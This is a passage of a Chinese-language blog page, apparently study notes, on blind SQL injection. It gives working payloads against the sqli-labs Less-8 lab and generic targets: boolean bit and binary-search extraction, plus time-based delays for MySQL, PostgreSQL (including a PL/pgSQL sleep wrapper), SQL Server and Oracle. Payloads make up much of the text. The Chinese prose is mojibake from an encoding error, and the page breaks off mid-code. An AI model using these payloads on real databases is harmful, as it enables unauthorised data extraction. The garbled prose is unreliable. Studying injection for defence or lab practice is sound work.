href="#SQLç›²æ³¨æŠ€æœ¯" class="headerlink" title="SQLç›²æ³¨æŠ€æœ¯"></a>SQLç›²æ³¨æŠ€æœ¯</h4><h5 id="æ¨æ–­æ”»å‡»æŠ€æœ¯"><a href="#æ¨æ–­æ”»å‡»æŠ€æœ¯" class="headerlink" title="æ¨æ–­æ”»å‡»æŠ€æœ¯"></a>æ¨æ–­æ”»å‡»æŠ€æœ¯</h5><p>å½“è¯·æ±‚çš„ä½ä¸º1æ—¶ï¼Œå“åº”ä¼šæœ‰ä¸“é—¨çš„æ ‡å¿—ï¼›è€Œå½“è¯·æ±‚çš„ä½ä¸º0æ—¶ï¼Œåˆ™ä¼šäº§ç”Ÿä¸åŒçš„å“åº”ã€‚å“åº”ä¸­çš„çœŸæ­£å·®å¼‚å–å†³äºæ‰€é€‰ç”¨çš„æ¨æ–­å·¥å…·ï¼Œæ‰€ä½¿ç”¨çš„æ–¹æ³•åˆ™å¤§å¤šåŸºäºå“åº”æ—¶é—´ã€é¡µé¢å†…å®¹ã€é¡µé¢é”™è¯¯æˆ–ä»¥ä¸Šè¿™äº›å› ç´ çš„ç»„åˆã€‚</p><p>æ¡ä»¶åˆ†æ”¯IFè¯­å¥ï¼Œæ”»å‡»è€…èƒ½é€šè¿‡å“åº”çš„ä¸åŒæ¨æ–­å‡ºæ˜¯å“ªä¸ªåˆ†æ”¯</p><p>sqli-labsç¤ºä¾‹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//sql/Less-8/?id=1</span><span class="token comment">#you are in</span>http:<span class="token comment">//sql/Less-8/?id=1' and '1'='1</span><span class="token comment">#you are in</span>http:<span class="token comment">//sql/Less-8/?id=1' and '1'='2</span><span class="token comment">#</span>http:<span class="token comment">//sql/Less-8/?id=1' or '1'='1</span><span class="token comment">#you are in</span><span class="token comment">#å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ç§çŠ¶æ€ï¼Œç©ºç™½å’Œyou are in</span>http:<span class="token comment">//sql/Less-8/?id=1' and (ascii(substr((select database()),1,1)))=115 %23</span><span class="token comment">#you are in</span>å¯ä»¥åˆ¤æ–­æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯shttp:<span class="token comment">//sql/Less-8/?id=1' and (ascii(substr((select database()),2,1)))=101 %23</span><span class="token comment">#you are in</span>ç»è¿‡å¤šæ¬¡æ³¨å…¥å°±èƒ½å°†æ•°æ®å…¨éƒ¨æ£€ç´¢å‡ºæ¥http:<span class="token comment">//sql/Less-8/?id=1' and (length(database()))=8 %23</span><span class="token comment">#you are in</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="å¢åŠ æ¨æ–­æ”»å‡»æŠ€æœ¯çš„å¤æ‚æ€§"><a href="#å¢åŠ æ¨æ–­æ”»å‡»æŠ€æœ¯çš„å¤æ‚æ€§" class="headerlink" title="å¢åŠ æ¨æ–­æ”»å‡»æŠ€æœ¯çš„å¤æ‚æ€§"></a>å¢åŠ æ¨æ–­æ”»å‡»æŠ€æœ¯çš„å¤æ‚æ€§</h5><ul><li><p>äºŒåˆ†æœç´ æ–¹æ³•ï¼ˆåˆ†åŠç®—æ³•ï¼‰</p><p>ä¸¤ç§çŠ¶æ€ï¼Œæ·»åŠ ç¬¬ä¸‰ç§çŠ¶æ€å¯ä»¥å°†æœ€ä½³è¯·æ±‚æ¬¡æ•°é™ä¸º1ï¼Œä¹Ÿå¯ä»¥è‡ªå·±åˆ›å»ºå­—æ¯è¡¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1)) &gt;127-- (False)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">63</span><span class="token comment">-- (True)</span>Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER, 1, 1) )&gt;95-- (True)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">111</span><span class="token comment">-- (True)</span>Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;119-- (False)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">115</span><span class="token comment">-- (False)</span>Incubating<span class="token string">' AND ASCII(SUBSTRING (SYSTEM USER,1,1)) &gt;113-- (True)Incubating'</span> <span class="token operator">AND</span> ASCII<span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">114</span><span class="token comment">-- (True)</span><span class="token comment">-- è‡ªå»ºå­—æ¯è¡¨ï¼Œä¼˜åŒ–äºŒåˆ†æ³•</span>Incubating<span class="token string">' and SUBSTRING ('</span>c4ca4238a0b923820dcc509a6f75849b<span class="token string">',1,1) in('</span><span class="token number">0</span><span class="token string">','</span><span class="token number">1</span><span class="token string">','</span><span class="token number">2</span><span class="token string">','</span><span class="token number">3</span><span class="token string">','</span><span class="token number">4</span><span class="token string">','</span><span class="token number">5</span><span class="token string">','</span><span class="token number">6</span><span class="token string">','</span><span class="token number">7</span>'<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>é€ä½æ–¹æ³•</p><p><img src="https://z3.ax1x.com/2021/07/19/WJ5E9J.png" alt="WJ5E9J.png"></p><p>å¯¹æ¯ä½ï¼ˆbitï¼‰è¿›è¡Œæ¯”å¯¹</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Incubating<span class="token string">'AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp;128-128-- (False)Incubating'</span><span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token number">64</span><span class="token operator">=</span><span class="token number">64</span><span class="token comment">-- (True)</span>Incubating<span class="token string">'AND ASCII (SUBSTRING (SYSTEM USER, 1,1)) &amp;32=32-- (True)Incubating'</span><span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">16</span><span class="token operator">=</span><span class="token number">16</span><span class="token comment">-- (True)</span>Incubating<span class="token string">' AND ASCII (SUBSTRING (SYSTEM USER, 1, 1)) &amp; 8=8-- (False)Incubating'</span> <span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">4</span><span class="token operator">=</span><span class="token number">4</span><span class="token comment">-- (False)</span>Incubating<span class="token string">'AND ASCII (SUBSTRING (SYSTEM USER, 1,1))&amp; 2=2-- (True)Incubating'</span><span class="token operator">AND</span> ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span>SYSTEM <span class="token keyword">USER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">-- (True)</span><span class="token comment">-- tureä»£è¡¨1ï¼Œfalseä»£è¡¨0ï¼Œæ¯”å¯¹å‡ºå¾—åˆ°01110011ï¼Œåè¿›åˆ¶115ï¼Œå­—æ¯s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="éä¸»æµé€šé“æŠ€æœ¯"><a href="#éä¸»æµé€šé“æŠ€æœ¯" class="headerlink" title="éä¸»æµé€šé“æŠ€æœ¯"></a>éä¸»æµé€šé“æŠ€æœ¯</h5><p>ç”¨çš„ä¼ è¾“é€šé“è€Œéé¡µé¢å“åº”ï¼Œå®ƒçš„ä¼ è¾“é€šé“åŒ…æ‹¬DNSã€e-mailå’ŒHTTPè¯·æ±‚ã€‚éä¸»æµé€šé“æŠ€æœ¯æ›´é‡è¦çš„ç‰¹ç‚¹æ˜¯ï¼šå®ƒä»¬é€šå¸¸æ”¯æŒä¸€æ¬¡æ£€ç´¢å¤šå—æ•°æ®ï¼Œè€Œä¸æ˜¯æ¨æ–­å•ä¸ªä½æˆ–å•ä¸ªå­—èŠ‚çš„å€¼ã€‚</p><h3 id="ä½¿ç”¨åŸºäºæ—¶é—´æŠ€æœ¯"><a href="#ä½¿ç”¨åŸºäºæ—¶é—´æŠ€æœ¯" class="headerlink" title="ä½¿ç”¨åŸºäºæ—¶é—´æŠ€æœ¯"></a>ä½¿ç”¨åŸºäºæ—¶é—´æŠ€æœ¯</h3><p>å‘å‡ºè¯·æ±‚åˆ°å“åº”åˆ°è¾¾è¿™æ®µæ—¶é—´çš„å·®å¼‚ã€‚å½“æŸä¸€çŠ¶æ€ä¸ºçœŸæ—¶ï¼Œå¦‚æœèƒ½å¤Ÿè®©å“åº”æš‚åœå‡ ç§’é’Ÿï¼Œ è€Œå½“çŠ¶æ€ä¸ºå‡æ—¶ï¼Œèƒ½å¤Ÿä¸å‡ºç°æš‚åœ</p><h4 id="å»¶è¿Ÿæ•°æ®åº“æŸ¥è¯¢"><a href="#å»¶è¿Ÿæ•°æ®åº“æŸ¥è¯¢" class="headerlink" title="å»¶è¿Ÿæ•°æ®åº“æŸ¥è¯¢"></a>å»¶è¿Ÿæ•°æ®åº“æŸ¥è¯¢</h4><h5 id="Mysqlå»¶è¿Ÿ"><a href="#Mysqlå»¶è¿Ÿ" class="headerlink" title="Mysqlå»¶è¿Ÿ"></a>Mysqlå»¶è¿Ÿ</h5><p> ä¸¤ä¸ªå‡½æ•°ï¼Œsleep()ï¼Œbenchmark(n,expression)</p><p>sleep(N)å¼ºåˆ¶å»¶è¿ŸNç§’</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>php?canshu<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select if(substring(user(),1,4)='</span>root'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>benchmark(N,expression)æ‰§è¡Œè¡¨è¾¾å¼expression Næ¬¡ï¼Œé€šå¸¸è¡¨è¾¾å¼ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œè¿™æ ·èƒ½å¢åŠ æ‰§è¡Œæ—¶é—´</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token punctuation">.</span>php?canshu<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select if(substring(user(),1,4)='</span>root'<span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šå¸¸<code>'root'</code>å†™æˆ16è¿›åˆ¶0x726f6f74ï¼ˆåªç¼–ç äº†rootï¼‰ï¼Œåªç”¨å¯ä»¥å»æ‰å•å¼•å·</p><ul><li><p>äºŒåˆ†æ³•</p><p>ä¾ç„¶æ˜¯ä¸¤ç§çŠ¶æ€ï¼Œå»¶è¿Ÿå’Œæœªå»¶è¿Ÿ</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span>â€¦â€¦<span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token punctuation">,</span>SLEEP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTRING<span class="token punctuation">(</span><span class="token punctuation">(</span>â€¦â€¦<span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span>k<span class="token punctuation">,</span>benchmark<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kæ˜¯äºŒåˆ†ä¸­é—´å€¼</p></li><li><p>é€ä½</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' UNION SELECT IF (ASCII (SUBSTRING ((â€¦â€¦), i, 1))&amp;2^j =2^j,SLEEP(1), 1) # '</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token keyword">IF</span> <span class="token punctuation">(</span>ASCII <span class="token punctuation">(</span>SUBSTRING <span class="token punctuation">(</span><span class="token punctuation">(</span>â€¦â€¦<span class="token punctuation">)</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j <span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">,</span>BENCHMARK<span class="token punctuation">(</span><span class="token number">100000000</span><span class="token punctuation">,</span> RAND<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p>ä¸€éƒ¨åˆ†æ³¨å…¥åœ¨whereå­—å¥ä¸­ï¼Œè¿™æ—¶å»¶è¿Ÿä¼šåœ¨åŒ¹é…è¡¨ä¸­æ¯ä¸€è¡Œéƒ½ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œæ—¶é—´ä¼šå¾ˆé•¿</p><h5 id="PostgreSQLå»¶è¿ŸæŠ€æœ¯"><a href="#PostgreSQLå»¶è¿ŸæŠ€æœ¯" class="headerlink" title="PostgreSQLå»¶è¿ŸæŠ€æœ¯"></a>PostgreSQLå»¶è¿ŸæŠ€æœ¯</h5><p>8.1æˆ–è€…æ›´ä½çš„ç‰ˆæœ¬ï¼Œä½¿ç”¨ç³»ç»Ÿåº“çš„sleep()å‡½æ•°åˆ›å»ºä¸€ä¸ªå‡½æ•°</p><p>8.2åŠæ›´é«˜çš„ç‰ˆæœ¬ï¼Œä¸æ˜¯ç”¨sleepï¼Œæä¾›äº†ä¸€ä¸ªå‡½æ•°<code>pg_sleep()</code>ï¼Œé»˜è®¤å®‰è£…ï¼Œè¿”å›å€¼æ˜¯voidï¼Œä¸èƒ½ç›´æ¥æ”¾åœ¨whereå­å¥ä¸­</p><p>è§£å†³æ–¹æ³•ï¼ŒPostgreSQLèƒ½ä½¿ç”¨å †å æŸ¥è¯¢ï¼Œç¬¬äºŒä¸ªæŸ¥è¯¢è¿”å›voidï¼Œå°†ç”±å½“å‰æ­£åœ¨æ‰§è¡Œçš„åº”ç”¨ç¨‹åºè¿›è¡Œå¤„ç†ï¼Œè¿™ä¼šå¯¼è‡´ä¸€ä¸ªé”™è¯¯ï¼Œå½“å‰ç¨‹åºå°†ä¼šå¤±è´¥ï¼Œæ·»åŠ ç¬¬ä¸‰ä¸ªå“‘æŸ¥è¯¢ï¼Œè¿”å›æ­£ç¡®æ•°é‡çš„åˆ—ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token number">1</span> <span class="token keyword">WHEN</span> <span class="token number">1</span> <span class="token keyword">THEN</span> pg_sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">END</span><span class="token punctuation">;</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">,</span><span class="token boolean">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦ä¸€ç§è§£å†³æ–¹æ³•ï¼Œå¦‚æœæ‹¥æœ‰åˆ›å»ºPL/pgSQLå‡½æ•°çš„æƒé™ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°å‡½æ•°æ¥å°è£…pg_sleep()ï¼Œå¹¶ä½¿å®ƒçš„è¿”å›å€¼ä¸ä¸ºvoidï¼Œè¿™æ ·å°±èƒ½æ›¿ä»£pg_sleep()ï¼Œæ•°æ®åº“æ‹¥æœ‰è€…å¿…é¡»ä¸ºæ¯ä¸ªæ•°æ®åº“å•ç‹¬å¯ç”¨PL/pgSQLè¯­è¨€ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span><span class="token punctuation">;</span> <span class="token comment">-- å¯ç”¨PL/pgSQL</span><span class="token comment">-- å®šä¹‰ä¸€ä¸ªå°è£…å‡½æ•°pause()</span><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> pause<span class="token punctuation">(</span><span class="token keyword">integer</span><span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">integer</span> <span class="token keyword">AS</span> $$<span class="token keyword">DECLARE</span>wait alias <span class="token keyword">for</span> $<span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">BEGIN</span>PERFORM pg_sleep<span class="token punctuation">(</span>wait<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">RETURN</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">END</span><span class="token punctuation">;</span>$$ <span class="token keyword">LANGUAGE</span> <span class="token string">'plpgsql'</span> STRICT<span class="token punctuation">;</span><span class="token comment">-- è°ƒç”¨</span>xxx<span class="token punctuation">.</span>php?id<span class="token operator">=</span><span class="token number">1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> usename <span class="token keyword">FROM</span> pg_user <span class="token keyword">WHERE</span> usesuper <span class="token operator">IS</span> <span class="token boolean">TRUE</span> <span class="token operator">and</span> <span class="token keyword">current_user</span><span class="token operator">=</span>usename<span class="token punctuation">)</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>äºŒåˆ†æ³•</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">';SELECT CASE WHEN (ASCII (SUBSTR (..., i,1)) &gt; k) THEN pg_sleep(1) END; SELECT NULL,...,NULL;-- '</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> k<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>é€ä½</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">';SELECT CASE WHEN (ASCII (SUBSTR (...,i,1)) &amp;2^j=2^j) THEN pg_sleep(1) END; SELECT NULL,...,NULL;'</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token keyword">CASE</span> <span class="token keyword">WHEN</span> <span class="token punctuation">(</span>ASCII <span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> PAUSE <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">ELSE</span> <span class="token number">1</span> <span class="token keyword">END</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">-- </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h5 id="SQL-Serverå»¶è¿Ÿ"><a href="#SQL-Serverå»¶è¿Ÿ" class="headerlink" title="SQL Serverå»¶è¿Ÿ"></a>SQL Serverå»¶è¿Ÿ</h5><p><code>waitfor delay '00:01:00'</code>å°†æ­£å¸¸æ‰§è¡Œæ—¶é—´å¢åŠ 1åˆ†é’Ÿï¼Œwaitfor delayä¸èƒ½åœ¨whereå­å¥ä¸­ä½¿ç”¨ï¼Œèƒ½ä½¿ç”¨å †å æŸ¥è¯¢</p><p>SQL serveré©±åŠ¨ç¨‹åºä¼šæŠŠç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿”å›ç»™æ­£åœ¨æ‰§è¡Œå¤„ç†çš„ç¨‹åºï¼Œåˆ†å·å‰é¢çš„ä¼šè¿”å›ç»™åé¢çš„è¯­å¥</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">FROM</span> reviews <span class="token keyword">WHERE</span> review_author<span class="token operator">=</span><span class="token string">'MadBob'</span><span class="token punctuation">;</span> <span class="token keyword">IF</span> <span class="token keyword">SYSTEM_USER</span><span class="token operator">=</span><span class="token string">'sa'</span> <span class="token keyword">WAITFOR</span> DELAY <span class="token string">'00:00:05'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœç”¨æˆ·åä¸ºsaï¼Œè¿”å›æ—¶é—´å°±å¤§äº5ç§’</p><p>è¿˜æœ‰ä¸€ç§æ–°æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯ä½¿ç”¨ä¸¤ä¸ªé€šè¿‡é€»è¾‘â€œä¸â€éš”å¼€çš„å­æŸ¥è¯¢ï¼Œå…¶ä¸­ä¸€ä¸ªå­æŸ¥è¯¢çš„æ‰§è¡Œæ—¶é—´ä¸ºå¾ˆå¤šç§’ï¼Œå¦ä¸€ä¸ªå­æŸ¥è¯¢åŒ…å«ä¸€ä¸ªæ¨æ–­æ£€æŸ¥ã€‚å¦‚æœæ£€æŸ¥å¤±è´¥(ç¬¬xä½ä¸º0)ï¼Œç¬¬äºŒä¸ªå­æŸ¥è¯¢å°†è¿”å›ï¼Œç¬¬ä¸€ä¸ªå­æŸ¥è¯¢åˆ™å› å—â€œä¸â€å­å¥çš„å½±å“è€Œæå‰ä¸­æ­¢ã€‚å®é™…ç»“æœæ˜¯ï¼Œå¦‚æœæ­£åœ¨æ¨æ–­çš„ä½ä¸º1ï¼Œé‚£ä¹ˆè¯·æ±‚å°†èŠ±è´¹æ¯”ä½ä¸º0æ—¶æ›´å¤šçš„æ—¶é—´ã€‚ï¼ˆå…¶ä»–æ•°æ®åº“é€šç”¨ï¼‰<a href="https://archive.codeplex.com/?p=marathontool">Marathon Tool - CodePlex Archive</a></p><ul><li><p>äºŒåˆ†æ³•</p></li><li><pre><code class="sql">;IF ASCII(SUBSTRING((...),i,1))&gt;k WAITFOR DELAY '00:00:05';-- <pre class="line-numbers language-none"><code class="language-none">- é€ä½  ```sql  ;IF ASCII (SUBSTRING ((...),i,1))&amp;2^j=2^j WAITFOR DELAY '00:00:05';--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ul><h5 id="Oracleå»¶è¿Ÿ"><a href="#Oracleå»¶è¿Ÿ" class="headerlink" title="Oracleå»¶è¿Ÿ"></a>Oracleå»¶è¿Ÿ</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span> DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>oralceä¸­è®¸å¤šSQLæ³¨å…¥éƒ½æŒ‡å‘DBMS_LOCKåŒ…ï¼Œå¹¶ä¸”è¿™ä¸ªåŒ…å¿…é¡»åœ¨ç®¡ç†å‘˜ä¸‹ä½¿ç”¨ï¼ŒåŒæ—¶oracleä¸æ”¯æŒå †å æŸ¥è¯¢ï¼Œæ‰€ä»¥sleep(n)åœ¨SQLè¯­å¥ä¸­ä¸å¥½åˆ©ç”¨</p><p>å¦‚æœæ³¨å…¥ç‚¹ä½äºPL/SQLå—ä¸­ï¼Œåˆ™èƒ½åˆ©ç”¨</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>BITAND<span class="token punctuation">(</span>ASCII<span class="token punctuation">(</span>SUBSTR<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>j<span class="token punctuation">)</span> <span class="token keyword">THEN</span> DBMS_LOCK<span class="token punctuation">.</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">END</span> <span class="token keyword">IF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨DBMS_PIPE.RECEIVE_MESSAGEå‡½æ•°å¯ä»¥å®ç°åŸºäºæ—¶é—´çš„ æ”»å‡»</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token 